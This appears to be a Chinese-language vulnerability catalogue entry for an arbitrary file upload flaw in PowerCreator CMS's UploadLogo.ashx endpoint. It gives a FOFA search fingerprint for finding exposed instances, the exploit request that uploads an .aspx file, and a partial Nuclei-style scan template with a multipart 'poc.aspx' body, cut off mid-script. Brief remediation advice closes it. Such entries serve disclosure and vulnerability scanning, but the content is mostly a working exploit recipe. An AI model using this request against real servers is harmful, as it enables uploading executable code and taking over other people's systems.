# PowerCreatorCMSUploadLogo存在任意文件上传

- **系统**：PowerCreatorCMSUploadLogo　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`App="PowerCreator-CMS"`
- **请求**：`POST /upload/UploadLogo.ashx?fileName={{filename}}.aspx HTTP/1.1`

**请求体 / payload**
```
1. Fofa
App="PowerCreator-CMS"
2、隐患url,复现如下
id: powercreatorcms-uploadlogo-upload
info:
name: PowerCreator CMS UploadLogo存在任意文件上传漏洞
author: xxx
severity: critical
variables:
payload: "{{to_lower(rand_base(6))}}"
filename: "{{to_lower(rand_base(6))}}"
http:
- raw:
-
Host: {{Hostname}}
Content-Length: 245
Content-Disposition: form-data;name="file1";filename="poc.aspx";
Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136
-----------------------------20873900192357278038549710136
Content-Disposition: form-data; name="file"; filename="poc.aspx"
Conte…（脚本共 843 字，完整版见原文）
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。